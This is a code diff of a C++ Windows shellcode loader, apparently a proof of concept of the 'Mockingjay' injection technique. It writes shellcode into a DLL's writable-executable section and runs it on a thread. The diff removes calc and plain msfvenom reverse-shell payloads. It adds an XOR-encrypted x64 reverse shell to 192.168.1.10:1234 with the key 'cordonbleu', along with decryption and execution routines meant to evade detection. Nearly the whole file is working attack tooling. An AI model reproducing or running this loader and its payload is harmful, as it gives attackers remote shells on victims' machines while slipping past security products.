@@ -5,70 +5,57 @@
 #include <vector>
 #include <iomanip>
 
-// Calc shellcode. Thread stuff working great with it, not with reverse shell
-/*unsigned char Shellcode[] =
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
-"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";*/
 
-// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.13.119 LPORT=1234 -f c
+// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=1234 -f c --encrypt xor --encrypt-key cordonbleu
 unsigned char Shellcode[] =
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
-"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
-"\x00\x49\x89\xe5\x49\xbc\x02\x00\x04\xd2\xc0\xa8\x0d\x77"
-"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
-"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
-"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
-"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
-"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
-"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
-"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
-"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
-"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
-"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
-"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
-"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
-"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
-"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
-"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
-
+"\x88\x3d\xf1\x90\x9c\x8d\xb4\x75\x72\x74\x2d\x34\x35\x25"
+"\x20\x25\x3a\x2d\x45\xa7\x17\x3c\xe7\x37\x14\x3d\xf9\x26"
+"\x74\x2d\xff\x27\x52\x3c\xe7\x17\x24\x3d\x7d\xc3\x26\x2f"
+"\x39\x44\xbb\x3c\x5d\xa5\xd8\x49\x13\x08\x6e\x49\x54\x34"
+"\xb3\xbd\x61\x24\x75\xb4\x90\x99\x3e\x24\x25\x3d\xf9\x26"
+"\x4c\xee\x36\x49\x3a\x75\xbc\xee\xf4\xfd\x72\x74\x6c\x2d"
+"\xf1\xb5\x06\x13\x24\x64\xa4\x25\xf9\x3c\x74\x21\xff\x35"
+"\x52\x3d\x6d\xb5\x97\x23\x3a\x8b\xa5\x24\xff\x41\xfa\x3c"
+"\x6d\xb3\x39\x44\xbb\x3c\x5d\xa5\xd8\x34\xb3\xbd\x61\x24"
+"\x75\xb4\x4a\x94\x19\x94\x38\x76\x3e\x50\x64\x20\x4d\xa4"
+"\x07\xac\x34\x21\xff\x35\x56\x3d\x6d\xb5\x12\x34\xf9\x78"
+"\x24\x21\xff\x35\x6e\x3d\x6d\xb5\x35\xfe\x76\xfc\x24\x64"
+"\xa4\x34\x2a\x35\x34\x3b\x2d\x2f\x33\x2c\x2d\x3c\x35\x2f"
+"\x3a\xf7\x80\x45\x35\x27\x8d\x94\x34\x24\x2d\x2f\x3a\xff"
+"\x7e\x8c\x23\x8a\x8d\x8b\x31\x2c\xca\x02\x01\x46\x33\x56"
+"\x46\x75\x72\x35\x3a\x2c\xfd\x93\x3a\xf5\x80\xc5\x75\x75"
+"\x72\x3d\xe5\x80\x3d\xc9\x70\x74\x68\xb7\xb4\xdd\x7f\x03"
+"\x2d\x31\x3d\xfc\x96\x38\xe5\x94\x35\xcf\x3e\x03\x4a\x62"
+"\x8b\xa0\x3e\xfd\x86\x0d\x75\x74\x72\x74\x35\x24\xce\x5c"
+"\xf2\x1f\x6c\x9a\xa1\x25\x22\x39\x5d\xac\x39\x44\xb2\x3c"
+"\x93\xa5\x3c\xfc\xb0\x3c\x93\xa5\x3c\xfc\xb3\x35\xd6\x8f"
+"\x7b\xaa\x92\x8b\xb9\x2d\xfd\xb2\x18\x64\x2d\x3d\x38\xfc"
+"\x90\x3c\xe5\x9c\x35\xcf\xeb\xd1\x18\x04\x8b\xa0\x3a\xf5"
+"\xa8\x25\x76\x75\x72\x3d\xd4\x06\x19\x11\x72\x74\x6c\x65"
+"\x74\x34\x22\x35\x3c\x2d\xfd\x97\x25\x23\x3b\x28\x45\xb5"
+"\x18\x79\x35\x24\x24\x97\x8e\x12\xab\x21\x50\x21\x73\x75"
+"\x24\xe8\x30\x51\x6a\xb2\x6c\x0d\x3c\xfc\x94\x22\x3c\x24"
+"\x24\x34\x22\x35\x3c\x2c\x8b\xb5\x33\x24\x25\x9a\xbc\x38"
+"\xfb\xb5\x20\xec\xb5\x34\xc8\x0d\xa0\x5a\xf2\x8a\xa7\x3c"
+"\x5d\xb7\x3c\x8a\xb8\xff\x62\x24\xce\x7d\xf5\x69\x0c\x9a"
+"\xa1\xce\x82\xc1\xce\x33\x35\xcf\xd4\xe1\xd1\xf8\x8b\xa0"
+"\x3a\xf7\xa8\x4d\x48\x73\x0e\x7e\xec\x9e\x94\x00\x77\xcf"
+"\x2b\x76\x06\x1a\x18\x74\x35\x24\xfd\xaf\x8d\xa1";
 
 struct SectionDescriptor {
     LPVOID start;
     LPVOID end;
 };
+
+unsigned char xor_key[256] = {};
+size_t keySize = 0;
+
+// Function to convert XOR key argument to unsigned char array
+void ConvertXORKey(const char* keyStr, unsigned char* xor_key, size_t keySize) {
+    for (size_t i = 0; i < keySize; ++i) {
+        xor_key[i] = keyStr[i % strlen(keyStr)];
+    }
+}
 
 // Function to find offset of RWX section in given DLL
 DWORD_PTR FindRWXOffset(HMODULE hModule) {
@@ -97,7 +84,7 @@ DWORD_PTR FindRWXSize(HMODULE hModule) {
         for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
             if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                 DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
-                std::cout << "Size of RWX section : " << std::dec << sectionSize << std::endl;
+                std::cout << "Size of RWX section : " << std::dec << sectionSize << " bytes" << std::endl;
                 return sectionSize;
             }
             sectionHeader++;
@@ -107,36 +94,32 @@ DWORD_PTR FindRWXSize(HMODULE hModule) {
 }
 
 // Function to compare the size of the RWX section and shellcode
-bool IsShellcodeFitting(DWORD_PTR rwxSectionSize, SIZE_T shellcodeSize) {
-    return (shellcodeSize <= rwxSectionSize);
+bool IsShellcodeFitting(DWORD_PTR sectionSize, SIZE_T shellcodeSize) {
+    return (shellcodeSize <= static_cast<SIZE_T>(sectionSize));
 }
 
-// Function to write Shellcode to RWX section of DLL
-BOOL WriteCodeToSection(LPVOID rwxSectionAddr, const unsigned char* shellcode, SIZE_T sizeShellcode, DWORD_PTR rwxSectionSize) {
-    std::cout << "Size of shellcode : " << std::dec << sizeShellcode << "\n";
-    if (IsShellcodeFitting(rwxSectionSize, sizeShellcode)) {
-        // Write the shellcode in the RWX section only if the size of the DLL's RWX section is large enough
-        memcpy(rwxSectionAddr, shellcode, sizeShellcode);
-        std::cout << std::dec << sizeShellcode << " bytes of shellcode written to RWX Memory Region\n";
-        return true;
-    }
-    else {
-        std::cout << "[!] Error: Shellcode is too big for the RWX section.\n";
-        return false;
+// Function to decrypt XOR shellcode
+void DecryptShellcode(unsigned char* Shellcode, size_t size, const unsigned char* xor_key, size_t keySize) {
+    for (size_t i = 0; i < size; ++i) {
+        Shellcode[i] ^= xor_key[i % keySize];
     }
 }
 
 // Function to execute Shellcode from RWX section of DLL
 void ExecuteShellcode(LPVOID lpParam) {
-    //LPVOID rwxSectionAddr = lpParam;
     unsigned char* shellcode = reinterpret_cast<unsigned char*>(lpParam);
+
+    // Decrypt the shellcode using the xor_key
+    const size_t shellcodeSize = sizeof(Shellcode);
+    DecryptShellcode(shellcode, shellcodeSize, xor_key, keySize);
+    
     // Define a function pointer to the shellcode
     using ShellcodeFunction = void(*)();
     ShellcodeFunction shellcodeFunction = reinterpret_cast<ShellcodeFunction>(shellcode);
 
     // Call the shellcode function
+    std::cout << "Execution of shellcode from RWX Memory Region..." << std::endl;
     shellcodeFunction();
-    std::cout << "Execution of shellcode from RWX Memory Region\n"; // Not displayed, not sure why
 }
 
 // Wrapper function with LPTHREAD_START_ROUTINE signature (not quite sure I got this right). I think it's some kind of bridge between CreateThread() and ExecuteShellcode()
@@ -148,29 +131,37 @@ DWORD WINAPI ShellcodeThreadWrapper(LPVOID lpParam) {
 
 int main(int argc, char* argv[]) {
 
-    std::cout << "\nMOCKINGJAY SUPER ASCII ART\n\n";
+    std::cout << "\nMOCKINGJAY SUPER ASCII ART\n" << std::endl;
 
-    if (argc != 2) {
-        std::cerr << "Error: Please provide the path to the DLL as a positional argument.\n";
-        std::cout << "Usage: " << argv[0] << " PATH_TO_DLL" << std::endl;
+    if (argc != 3) {
+        std::cerr << "[!] Error: Please provide the XOR key and the path to the DLL as a positional argument.\n" << std::endl;
+        std::cout << "Usage: " << argv[0] << " MY_XOR_KEY PATH_TO_DLL\n" << std::endl;
         return 1;
     }
 
+    // Convert XOR key from argument to array
+    keySize = strnlen_s(argv[1], sizeof(xor_key));
+    if (keySize > sizeof(xor_key)) {
+        std::cerr << "[!] Error: XOR key is too long. Use a key smaller than 256 bytes !\n" << std::endl;
+        return 1;
+    }
+    ConvertXORKey(argv[1], xor_key, keySize);
+
     // Necessary to convert the DLL path to wide string to properly handle possible spaces in path
-    std::wstring dllPath = std::wstring(argv[1], argv[1] + strlen(argv[1]));
+    std::wstring dllPath = std::wstring(argv[2], argv[2] + strlen(argv[2]));
 
     // Load DLL from argument
     HMODULE TargetDLL = ::LoadLibraryW(reinterpret_cast<LPCWSTR>(dllPath.c_str()));
 
     if (TargetDLL == nullptr) {
         // Failed to load the DLL
-        std::cout << "[!] Failed to load the targeted DLL\n";
+        std::cerr << "[!] Failed to load the targeted DLL\n" << std::endl;
         return 1;
     }
 
     MODULEINFO moduleInfo;
     if (!::GetModuleInformation(::GetCurrentProcess(),TargetDLL,&moduleInfo,sizeof(MODULEINFO))) {
-        std::cout << "[!] Failed to get module info\n";
+        std::cerr << "[!] Failed to get module info\n" << std::endl;
         return 1;
     }
 
@@ -188,22 +179,36 @@ int main(int argc, char* argv[]) {
     };
     std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;
 
-    // Call write function
-    if (WriteCodeToSection(rwxSectionAddr, Shellcode, sizeof(Shellcode), FindRWXSize(TargetDLL))) {
-        // Shellcode was written successfully, proceed with execution of the shellcode on separate thread
-        HANDLE hThread = CreateThread(NULL, 0, ShellcodeThreadWrapper, rwxSectionAddr, 0, NULL);
-        if (hThread == NULL) {
-            std::cout << "[!] Error creating thread.\n";
-            return 1;
-        }
+    // Calculate the size of the shellcode
+    const size_t shellcodeSize = sizeof(Shellcode);
 
-        // Wait for the shellcode thread to complete
-        WaitForSingleObject(hThread, INFINITE); // Maybe need to change INFINITE. Need more tests...
-        CloseHandle(hThread);
-
-    } else {
+    // Check if shellcode can fit in the RWX section
+    if (!IsShellcodeFitting(RWX_SECTION_SIZE, shellcodeSize)) {
+        std::cerr << "\n[!] Error: Shellcode is too big for the RWX section.\n" << std::endl;
         return 1;
     }
+
+    // Write the shellcode to the RWX section
+    std::cout << "Size of shellcode : " << std::dec << shellcodeSize << " bytes" << std::endl;
+    errno_t err = memcpy_s(rwxSectionAddr, RWX_SECTION_SIZE, Shellcode, shellcodeSize);
+    if (err != 0) {
+        std::cerr << "[!] Error: Failed to copy shellcode to RWX section." << std::endl;
+        return 1;
+    }
+    else {
+        std::cout << std::dec << shellcodeSize << " bytes of shellcode written to RWX Memory Region" << std::endl;
+    }
+
+    // Execute the shellcode on a separate thread
+    HANDLE hThread = CreateThread(NULL, 0, ShellcodeThreadWrapper, rwxSectionAddr, 0, NULL);
+    if (hThread == NULL) {
+        std::cout << "[!] Error creating thread.\n" << std::endl;
+        return 1;
+    }
+
+    // Wait for the shellcode thread to complete
+    WaitForSingleObject(hThread, 3000); //I put 3 seconds to wait and it works with a msfvenom reverse shell. However, I cannot promise it will be enough for every shellcode. Need to fix this. Make a dynamic check or whatever...
+    CloseHandle(hThread);
 
     return 0;
 }
